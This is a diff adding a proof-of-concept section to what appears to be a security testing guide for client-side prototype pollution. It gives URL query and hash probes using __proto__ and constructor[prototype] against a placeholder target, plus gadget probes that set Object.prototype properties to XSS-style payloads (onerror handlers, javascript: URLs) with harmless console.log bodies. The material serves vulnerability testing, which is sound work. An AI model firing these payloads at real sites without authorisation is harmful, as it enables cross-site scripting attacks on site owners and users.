@@ -669,6 +669,36 @@ Object.defineProperty(Object.prototype, 'YOUR-PROPERTY', {
 
 ---
 
+## Dynamic Test / PoC
+
+**URL/query pollution probes** — load each in a fresh tab; bracket, dot, and constructor forms exercise different filters:
+
+```
+https://TARGET/?__proto__[polluted]=1
+https://TARGET/?__proto__.polluted=1
+https://TARGET/?constructor[prototype][polluted]=1
+https://TARGET/#__proto__[polluted]=1
+```
+
+**Pollution reflection** — in DevTools console after navigation:
+
+```javascript
+console.log(({}).polluted);  // "1" (or injected value) confirms Object.prototype write
+```
+
+**Gadget escalation probes** — use documented gadget keys when a library is known; otherwise harmless property names confirm inherited-default reads:
+
+```javascript
+Object.prototype.innerHTML = '<img src=x onerror=console.log(1)>';
+Object.prototype.src = 'javascript:console.log(1)';
+Object.prototype.href = 'javascript:console.log(1)';
+Object.prototype['data-tooltip'] = '<img src=x onerror=console.log(1)>';
+```
+
+Re-test `constructor[prototype]` when `__proto__` is stripped; re-test `#__proto__…` when only hash parsers are in scope.
+
+---
+
 ## Confirming a Finding
 
 1. Identify the pollution source: name the parser/merge call (`location.hash` walked by `jquery-deparam`, `$.extend(true, …)`, `_.merge`, hand-rolled `for…in`, BlackFan-cataloged URL parser, etc.) and show the file + line.
